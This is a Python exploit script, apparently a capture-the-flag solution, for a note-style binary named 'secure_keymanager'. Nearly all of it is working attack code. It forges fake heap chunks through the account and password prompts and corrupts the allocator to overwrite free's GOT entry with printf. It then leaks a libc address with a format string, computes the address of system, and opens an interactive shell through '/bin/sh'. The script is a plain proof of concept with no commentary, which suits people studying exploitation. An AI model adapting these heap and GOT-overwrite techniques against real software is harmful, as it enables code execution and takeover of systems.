#!/usr/bin/env python
from sc_expwn import *  # https://github.com/shift-crops/sc_expwn/blob/master/sc_expwn.py

bin_file = './secure_keymanager'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'localhost', 'port':47225})
env.select()

#==========

binf = ELF(bin_file)
addr_plt_printf     = binf.plt['printf']
addr_got_free       = binf.got['free']
addr_master         = binf.symbols['master']

libc = binf.libc
offset_libc_main    = libc.sep_function['__libc_start_main']

#==========

def attack(conn):
    note = Note(conn)

    fake_chunk_1  = p64(0)
    fake_chunk_1 += p64(0x71)
    conn.sendafter('Set Your Account Name >> ', fake_chunk_1)
    note.account = fake_chunk_1

    fake_chunk_2  = p64(0)
    fake_chunk_2 += p64(0xffffffffffffff91)
    conn.sendafter('Set Your Master Pass >> ', fake_chunk_2)
    note.master = fake_chunk_2

    note.add(0xa00000, 'A', 'A')
    note.remove(0)
    note.add(0xa00000, 'B', 'B')
    note.remove(0)
    
    note.add(0x10, '0', '0')
    note.add(0x10, '1', '1')
    note.add(0x60, 'a', 'a')
    note.edit(2, 'a')

    note.remove(0)
    note.remove(1)
    note.remove(0)

    note.add(0x10, p64(addr_master), 'master')
    note.remove(2)

    fake_chunk_1  = p64(0xffffffffffffff90)
    fake_chunk_1 += p64(0x70)
    note.account = fake_chunk_1

    fake_chunk_2  = p64(0)
    fake_chunk_2 += p64(0xa00001)
    note.change_master(fake_chunk_2)

    note.add(0xa00000, 'C', 'C')

    fake_chunk_2  = p64(0)
    fake_chunk_2 += p64(0xffffffffffffff91)
    note.change_master(fake_chunk_2)

    note.add((addr_got_free-addr_master-0x20) - 0x20, '%13$lx', None)
    note.add(0x70 - 0x20, p64(0xdeadbeef)+p64(addr_plt_printf)[:-1], p64(0xcafebabe)[:-1])
    note.account = p64(0x40)

    note.remove(2)

    addr_libc_main = int(conn.recvuntil('done.')[:-5], 16)  - 0xf0
    libc.address = addr_libc_main - offset_libc_main
    info('addr_libc_base   = 0x{:08x}'.format(libc.address))
    addr_libc_system = libc.sep_function['system']
    
    note.edit(3, '/bin/sh\x00'+p64(addr_libc_system)[:-1])

class Note:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendafter      = conn.sendafter

    def add(self, size, title, key):
        self.sendafter('>> ', '1')

        self.sendafter('...', str(size))
        self.sendafter('...', title)
        if key:
            self.sendafter('...', key)

    def edit(self, n, key):
        self.sendafter('>> ', '3')

        self.check_account()
        self.sendafter('...', str(n))
        self.sendafter('...', key)

    def remove(self, n):
        self.sendafter('>> ', '4')

        self.check_account()
        self.sendafter('...', str(n))

    def change_master(self, key):
        self.sendafter('>> ', '9')

        self.check_account()
        self.sendafter('Set New Master Pass >> ', key)
        self.master = key

    def exit(self):
        self.sendafter('>> ', '0')

    def check_account(self):
        self.sendafter('>> ', self.account if self.account[0] != '\x00' else '\x00')
        if self.master[0] != '\x00':
            self.sendafter('>> ', self.master)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
